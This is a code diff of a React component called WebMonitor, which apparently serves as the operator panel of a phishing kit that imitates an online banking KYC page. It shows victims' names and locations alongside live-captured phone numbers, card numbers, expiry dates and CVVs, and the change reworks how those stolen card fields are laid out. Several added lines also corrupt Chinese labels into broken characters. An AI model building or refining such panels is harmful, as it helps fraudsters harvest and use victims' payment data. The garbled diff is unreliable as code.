@@ -85,7 +85,7 @@ const submissionData: UserSubmission[] = [
     websiteName: "在线银行系统",
     currentPage: "/kyc/identity-check",
     userName: "王大强",
-    userLocation: "广州市天河区",
+    userLocation: "��州市天河区",
     timestamp: "2024-01-20 10:20:33",
     riskLevel: "high",
     dataSize: "1.2Mb",
@@ -210,7 +210,7 @@ export function WebMonitor() {
                 🔴 LIVE - {onlineCount} 在线处理
               </Badge>
               <Badge variant="outline" className="bg-blue-50 text-blue-600 border-blue-200">
-                今日提交: {todaySubmissions}
+                今日提��: {todaySubmissions}
               </Badge>
             </div>
           </div>
@@ -262,40 +262,38 @@ export function WebMonitor() {
                     {submission.statusText}
                   </div>
 
-                  {/* 实时输入的敏感信息 */}
+                  {/* 实时输入的敏感信息 - 水平一排显示 */}
                   {submission.realtimeInput && (
-                    <div className="mt-2 p-2 bg-gray-50 rounded border-l-2 border-red-400">
-                      <div className="text-xs font-medium text-gray-700 mb-1 flex items-center gap-1">
-                        🔴 实时输入
-                        <span className="animate-pulse">●</span>
-                      </div>
-                      <div className="space-y-1 text-xs">
+                    <div className="mt-2 p-2 bg-red-50 rounded border border-red-200">
+                      <div className="flex items-center gap-4 text-xs">
+                        <div className="flex items-center gap-1 text-red-600 font-medium">
+                          🔴 实时输入
+                          <span className="animate-pulse">●</span>
+                        </div>
                         {submission.realtimeInput.phone && (
-                          <div className="flex items-center gap-2">
-                            <span className="text-gray-500 w-8">📱</span>
+                          <div className="flex items-center gap-1">
+                            <span>📱</span>
                             <span className="font-mono text-gray-800">{submission.realtimeInput.phone}</span>
                           </div>
                         )}
                         {submission.realtimeInput.cardNumber && (
-                          <div className="flex items-center gap-2">
-                            <span className="text-gray-500 w-8">💳</span>
+                          <div className="flex items-center gap-1">
+                            <span>💳</span>
                             <span className="font-mono text-gray-800">{submission.realtimeInput.cardNumber}</span>
                           </div>
                         )}
-                        <div className="flex items-center gap-4">
-                          {submission.realtimeInput.expiryDate && (
-                            <div className="flex items-center gap-2">
-                              <span className="text-gray-500 w-8">📅</span>
-                              <span className="font-mono text-gray-800">{submission.realtimeInput.expiryDate}</span>
-                            </div>
-                          )}
-                          {submission.realtimeInput.cvv && (
-                            <div className="flex items-center gap-2">
-                              <span className="text-gray-500 w-8">🔒</span>
-                              <span className="font-mono text-gray-800">{submission.realtimeInput.cvv}</span>
-                            </div>
-                          )}
-                        </div>
+                        {submission.realtimeInput.expiryDate && (
+                          <div className="flex items-center gap-1">
+                            <span>📅</span>
+                            <span className="font-mono text-gray-800">{submission.realtimeInput.expiryDate}</span>
+                          </div>
+                        )}
+                        {submission.realtimeInput.cvv && (
+                          <div className="flex items-center gap-1">
+                            <span>🔒</span>
+                            <span className="font-mono text-gray-800">{submission.realtimeInput.cvv}</span>
+                          </div>
+                        )}
                       </div>
                     </div>
                   )}
@@ -400,7 +398,7 @@ export function WebMonitor() {
                 <div className="mt-3 pt-3 border-t border-border/30 animate-in slide-in-from-top-1 duration-200">
                   <div className="bg-muted/20 rounded-lg p-4">
                     <h4 className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
-                      👤 详细用户信息
+                      👤 详细��户信息
                     </h4>
                     <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-xs">
                       <div className="space-y-1">
